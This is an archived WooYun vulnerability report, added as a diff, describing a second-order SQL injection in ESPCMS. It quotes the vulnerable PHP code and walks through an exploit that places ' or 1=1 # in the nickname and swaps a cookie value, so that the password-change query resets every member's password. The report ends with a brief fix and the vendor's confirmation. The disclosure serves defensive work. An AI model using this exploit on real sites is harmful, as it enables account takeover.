@@ -1,0 +1,257 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		espcms  二次注入一枚  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		espcms  二次注入一枚  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Yaseng">Yaseng</a> 
+</li><li>提交时间：		2013-07-21 23:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-25：	细节向第三方安全合作伙伴开放<br/>
+									2013-08-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-11：	细节向普通白帽子公开<br/>
+									2013-08-31：	细节向实习白帽子公开<br/>
+									2013-10-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">espcms  二次注入一枚 </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1:通过 $alias 二次注入来控制sql    <br />
+<br />
+用户昵称 $alias  从数据库查询出来 未过滤 <br />
+<br />
+interface/member.php<br />
+<br />
+</p><pre><code>$db_sql = &quot;SELECT * FROM $db_table WHERE $db_where&quot;;<br />
+			$rsMember = $this-&gt;db-&gt;fetch_first($db_sql);<br />
+			if (!$rsMember) {<br />
+<br />
+			      ..................................................<br />
+                      $this-&gt;fun-&gt;setcookie(&#039;ecisp_member_info&#039;, $this-&gt;fun-&gt;eccode(&quot;$memberread[userid]|$memberread[alias]|$memberread[integral]|$memberread[mcid]|$memberread[email]|$memberread[lastip]|$ipadd|&quot; . md5($_SERVER[&#039;HTTP_USER_AGENT&#039;]) . &#039;|&#039; . md5(admin_ClassURL), &#039;ENCODE&#039;, db_pscode));</code></pre><p class='detail'><br />
+<br />
+//查询出来时 无  addcslashes  可造成二次注入    <br />
+<br />
+虽然cookie 加密 无法逆向,但是已经可以通过控制  $alias  来生成 某些sql  进行注入 <br />
+<br />
+2:$this-&gt;ec_member_username 注入   <br />
+<br />
+<br />
+<br />
+public\class_connector.php  文件 中<br />
+<br />
+  <br />
+<br />
+</p><pre><code>$this-&gt;ec_member_username = $this-&gt;fun-&gt;eccode($this-&gt;fun-&gt;accept(&#039;ecisp_member_username&#039;, &#039;C&#039;), &#039;DECODE&#039;, db_pscode);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ $this-&gt;ec_member_username   利用 1 来控制 sql  (无视  gpc ,无视单引号)<br />
+<br />
+随便找到一个调用  $this-&gt;ec_member_username 的地方   <br />
+<br />
+如  interface\membermain.php 文件中 修改密码处 <br />
+<br />
+<br />
+<br />
+ </p><pre><code>$db_where = &quot;userid=$this-&gt;ec_member_username_id AND username=&#039;$this-&gt;ec_member_username&#039; AND password=&#039;$oldpassword&#039;&quot;;<br />
+			$db_sql = &quot;SELECT * FROM $db_table WHERE $db_where&quot;;<br />
+		 <br />
+			$rsMember = $this-&gt;db-&gt;fetch_first($db_sql);<br />
+			 if (!$rsMember) {<br />
+				$linkURL = $this-&gt;mlink[&#039;memedit_password&#039;];<br />
+				$this-&gt;callmessage($this-&gt;lng[&#039;password_input_err&#039;], $linkURL, $this-&gt;lng[&#039;gobackbotton&#039;]);<br />
+			} else {<br />
+				$db_set = &quot;password=&#039;$password&#039;&quot;;<br />
+        $this-&gt;db-&gt;query(&#039;UPDATE &#039; . $db_table . &#039; SET &#039; . $db_set . &#039; WHERE &#039; . $db_where);</code></pre><p class='detail'><br />
+<br />
+调用了 $this-&gt;ec_member_username  可以进行注入  <br />
+<br />
+<br />
+<br />
+ 3:注入利用 <br />
+<br />
+  经过 1,2 分析  一次完整的注入攻击  <br />
+<br />
+登录 =&gt; 编辑资料(写入注入 payload) =&gt;退出 =&gt;登录 =&gt;设置cookie(ec_member_username =ecisp_member_info）=&gt;  修改密码 =&gt; sql 注入  <br />
+<br />
+比如我要修改 所有会员的密码    <br />
+<br />
+</p><p class="detail"><a href="../images/212206509f7370a1d78f25ce987fc8264872397c.jpg" target="_blank"><img src="../images/212206509f7370a1d78f25ce987fc8264872397c.jpg" alt="espcms_1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+编辑资料  昵称处填写   &#039; or 1=1 #   然后重新登录   修改cookie中  ec_member_username 的值为  ecisp_member_info的值 <br />
+<br />
+</p><p class="detail"><a href="../images/21220903a41167710d9204ffef9f8ae756ff74f7.jpg" target="_blank"><img src="../images/21220903a41167710d9204ffef9f8ae756ff74f7.jpg" alt="espcms_2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+新旧密码不要相同   此时的 sql 语句为:<br />
+<br />
+</p><pre><code>UPDATE espcms_member SET password=&#039;99754106633f94d350db34d548d6091a&#039; WHERE userid=1 AND username=&#039;1|&#039; or 1=1 #|0|1|fuckss@163.com|2130706433|2130706433|fed0b5cf0dbbcab3431bf3bb8fe88349|1002de5fc95a1b716a2e04ab8d78bf76&#039; AND password=&#039;1223b8c30a347321299611f873b449ad&#039;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+打完收工<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">如上 3  一系列xxoo <br />
+<br />
+sql 语句为 :<br />
+<br />
+<br />
+<br />
+</p><pre><code>UPDATE espcms_member SET password=&#039;99754106633f94d350db34d548d6091a&#039; WHERE userid=1 AND username=&#039;1|&#039; or 1=1 #|0|1|fuckss@163.com|2130706433|2130706433|fed0b5cf0dbbcab3431bf3bb8fe88349|1002de5fc95a1b716a2e04ab8d78bf76&#039; AND password=&#039;1223b8c30a347321299611f873b449ad&#039;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+即可中出  <br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤数据库查询出数据  <br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Yaseng" title="Yaseng">Yaseng</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-031669" title="espcms  二次注入一枚">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-07-22 10:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您的提供，我们会尽快修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="31669";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
